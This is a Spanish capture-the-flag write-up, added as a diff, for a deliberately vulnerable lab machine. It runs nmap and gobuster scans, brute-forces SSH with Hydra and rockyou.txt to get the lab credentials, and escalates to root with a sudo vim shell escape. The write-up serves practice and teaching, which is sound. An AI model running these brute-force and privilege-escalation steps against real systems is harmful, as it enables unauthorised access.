@@ -1,0 +1,81 @@
+# Trust
+  
+| OS     | Dificultad  | Creator           |
+| ------ | ----------- | -------------     | 
+| Linux  | Super Fácil | ElPinguinoDeMario | 
+
+## Contenidos
+1. [Escaneo y Reconocimiento de puertos](#Escaneo-y-Reconocimiento-de-puertos)
+2. [Enumeración Web](#Enumeración-Web)
+3. [Ataque de fuerza bruta con Hydra](#Ataque-de-fuerza-bruta-con-Hydra)
+4. [Intrusión y Escalada de privilegios](#Intrusión-y-Escalada-de-privilegios)
+
+
+## Escaneo y Reconocimiento de puertos
+
+Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap.
+
+![Reconocimiento](https://github.com/romabri/WriteUps/assets/51706860/9374ba63-c786-4e08-ae44-c3672d159e86)
+
+`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
+- `-p-` - Busqueda de puertos abiertos
+- `--open` - Enumera los puertos abiertos
+- `-sS` - Es un modo de escaneo rapido
+- `-sC-` - Que use un conjunto de scripts de reconocimiento
+- `-sV` - Que encuentre la version del servicio abirto
+- `--min-rate=5000` - Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
+- `-n` - No hace resolución DNS
+- `-Pn` - No hace ping
+- `-vvv` - Muestra en pantalla a medida que encuentra puertos (Verbose)
+
+Vemos que esta abierto el puerto 22 `SSH` y el puerto 80 `HTTP`
+
+## Enumeración Web
+
+Usamos `Gobuster` para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio.
+
+`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`
+- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
+- `-u http://172.20.10.5/` Especifica la URL objetivo que deseas escanear en busca de directorios.
+- `-w` Especifica que diccionario queremos usar
+- `-x` Para indicar que tipo de extension queremos que nos encuentre
+
+![web](https://github.com/romabri/WriteUps/assets/51706860/ce0df111-f0a7-4abc-8d00-955226c4aec8)
+
+Vemos que nos encuentra un directorio llamado secret.php. Si accedemos a él, vemos lo siguiente:
+
+![web2](https://github.com/romabri/WriteUps/assets/51706860/127749c8-2bba-4eaa-a83b-6a640b960bf4)
+
+Aparece el nombre de Mario, por lo que probablemente sea un posible usaurio.
+
+
+## Ataque de fuerza bruta con Hydra
+
+Como tenemos un possible usuario, vamos hacer un ataque de fuerza bruta con Hydra al protocolo ssh de la siguiente forma:
+
+`hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
+- `-l` - Para especificar el usaurio
+- `-P` - Para especificar que diccionario de fuerza bruta usaremos
+- `ssh://172.17.0.2` - Especificamos que queremos atentar contra el protocolo SSH de la IP victima
+
+
+![att](https://github.com/romabri/WriteUps/assets/51706860/4ff3c53d-abe0-434e-b23f-1e162b9f3dce)
+
+Como vemos, existe el usuario `mario` y la contraseña es `chocolate`.
+
+
+## Intrusión y Escalada de privilegios
+
+Ahora accedemos vía SSH 
+
+`ssh mario@172.17.0.2`
+
+Si hacemos el comando `sudo -l`, vemos que tenemos permisos para ejecutar como sudo el binario `VIM`
+
+Para poder escalar privilegios con este binario, hacemos lo siguiente:
+
+``sudo /usr/bin/vim -c ':!/bin/sh'`` 
+
+Esto nos lanzará una terminal pero en modo `ROOT` y ya habremos terminado la máquina.
+
+![imagen](https://github.com/romabri/WriteUps/assets/51706860/34672299-f455-4af2-bd6e-edb5bb059d46)
